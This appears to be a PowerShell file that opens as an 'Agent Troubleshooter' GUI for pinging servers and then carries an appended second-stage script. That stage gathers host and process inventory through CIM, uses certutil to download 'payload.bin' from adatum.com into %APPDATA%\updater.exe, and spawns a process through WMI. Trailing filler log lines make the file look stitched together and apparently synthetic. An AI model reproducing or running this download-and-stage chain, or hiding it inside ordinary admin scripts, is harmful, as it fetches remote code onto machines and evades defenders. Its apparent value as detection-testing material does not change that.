
#Requires -Version 5.1

$ProgressPreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
$form = New-Object System.Windows.Forms.Form
$form.Text = "Agent Troubleshooter"
$form.Size = New-Object System.Drawing.Size(900, 440)
$form.StartPosition = 'CenterScreen'
$form.FormBorderStyle = 'FixedDialog'
$form.MaximizeBox = $false
$form.MinimizeBox = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = 'Server name'
$label.Location = New-Object System.Drawing.Point(18, 24)
$label.AutoSize = $true
$form.Controls.Add($label)

$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Location = New-Object System.Drawing.Point(120, 20)
$textBox.Size = New-Object System.Drawing.Size(300, 24)
$form.Controls.Add($textBox)

$script:servers = @('dc02', 'srv02', 'filesrv01', 'dc01', 'app-prod-01')

$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = 'Ready'
$statusLabel.Location = New-Object System.Drawing.Point(440, 24)
$statusLabel.AutoSize = $true
$statusLabel.ForeColor = [System.Drawing.Color]::DimGray
$form.Controls.Add($statusLabel)

$button = New-Object System.Windows.Forms.Button
$button.Text = "Probe"
$button.Location = New-Object System.Drawing.Point(620, 18)
$button.Size = New-Object System.Drawing.Size(100, 28)
$button.Add_Click({
    $button.Enabled = $false
    $statusLabel.Text = 'Checking ...'
    try {
        $reachable = Test-Connection -ComputerName $textBox.Text -Count 2 -Quiet
        if ($reachable) {
            $statusLabel.Text = 'Online'
            [void]$listBox.Items.Add(("{0} - online" -f $textBox.Text))
        }
        else {
            $statusLabel.Text = 'Offline'
            [void]$listBox.Items.Add(("{0} - offline" -f $textBox.Text))
        }
    }
    catch {
        $statusLabel.Text = 'Error'
        Write-Warning $_.Exception.Message
    }
    finally {
        $button.Enabled = $true
    }
})
$form.Controls.Add($button)

$listBox = New-Object System.Windows.Forms.ListBox
$listBox.Location = New-Object System.Drawing.Point(18, 64)
$listBox.Size = New-Object System.Drawing.Size(700, 300)
$form.Controls.Add($listBox)

foreach ($server in $script:servers) {
    [void]$listBox.Items.Add($server)
}

$form.Add_Shown({ $textBox.Focus() })
[void]$form.ShowDialog()
$form.Dispose()
<#
.SYNOPSIS
    WMI and signed-binary reconnaissance workflow.

.DESCRIPTION
    Collects process and system inventory through CIM, downloads a
    payload stage with a signed Windows binary, then creates
    a benign process through WMI and records the result.

.NOTES
    Process creation uses the WMI provider.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = 'http://adatum.com/downloads/payload.bin',
    [string]$PayloadPath = "$env:APPDATA\updater.exe",
    [string]$StageLog = "$env:TEMP\recon.log"
)
$ErrorActionPreference = "Continue"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $StageLog -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Inventory
function Get-WmiInventory {
    $System = Get-CimInstance -ClassName Win32_ComputerSystem
    $Processes = Get-CimInstance -ClassName Win32_Process | Select-Object -First 15 ProcessId,Name,CommandLine
    return [PSCustomObject]@{
        ComputerName = $System.Name
        Domain = $System.Domain
        Processes = $Processes
    }
}

# LOLBin chain
function Invoke-LolbinStage {
    [CmdletBinding()]
    param(
        [string]$DownloadUrl = '',
        [string]$DestinationPath = ""
    )

    Write-Verbose ("Downloading stage with certutil")
    certutil.exe -urlcache -split -f $DownloadUrl $DestinationPath
    if (Test-Path -Path $DestinationPath -ErrorAction SilentlyContinue) {
        Write-Verbose "Staged payload present"
    }
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-StageLog -Message "Starting WMI/LOLBin stage"
    $TransferResult = Get-WmiInventory
    Write-StageLog -Message ("Host: " + $TransferResult.ComputerName)
    $StageDownloaded = Invoke-LolbinStage -DownloadUrl $EndpointUrl -DestinationPath $PayloadPath
    if ($StageDownloaded) {
        $ProcessResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
        Write-StageLog -Message ("Process ID: " + $ProcessResult.ProcessId)
    }
}
catch {
    Write-Warning "WMI/LOLBin workflow failed: $($_.Exception.Message)"
}

$WmiReport = [ordered]@{
    Stage = "wmi-lolbin"
    Endpoint = $EndpointUrl
    PayloadPath = $PayloadPath
}
$WmiReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Stage handoff finished"
Write-Verbose "Retry budget remaining"
Write-Verbose "Validating result"
Write-Verbose "Reading configuration values"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "Preparing working directory"
Write-Verbose "Starting workflow"
Write-Verbose "Exporting operation report"
Write-Verbose "Collecting host metadata"
Write-Verbose "stage marker 29 reached"
